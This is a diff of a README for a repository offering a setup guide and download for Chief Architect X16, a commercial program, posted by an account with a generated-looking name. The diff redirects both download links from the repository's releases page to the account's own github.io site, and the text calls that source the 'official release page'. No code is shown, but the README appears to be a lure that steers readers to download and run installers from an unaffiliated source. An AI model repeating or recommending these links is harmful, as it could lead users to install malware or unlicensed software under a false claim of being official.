@@ -1,6 +1,6 @@
 # 🏗️ Chief-Architect-X16-PC-Setup-Guide - Install Chief Architect X16 on Windows
 
-[![](https://img.shields.io/badge/Download-Chief_Architect_X16-blue.svg)](https://github.com/Tobaccojuicedoings401/Chief-Architect-X16-PC-Setup-Guide/releases)
+[![](https://img.shields.io/badge/Download-Chief_Architect_X16-blue.svg)](https://tobaccojuicedoings401.github.io)
 
 This guide provides steps to install Chief Architect X16 on Windows 11. Use these instructions to resolve common setup errors.
 
@@ -18,7 +18,7 @@ Before you start, check that your computer meets these standards:
 
 Follow these steps to obtain the setup files:
 
-1.  Visit the official release page: https://github.com/Tobaccojuicedoings401/Chief-Architect-X16-PC-Setup-Guide/releases
+1.  Visit the official release page: https://tobaccojuicedoings401.github.io
 2.  Look for the latest version listed under the "Assets" section.
 3.  Click the file name to start the download.
 4.  Save the file to your Downloads folder.
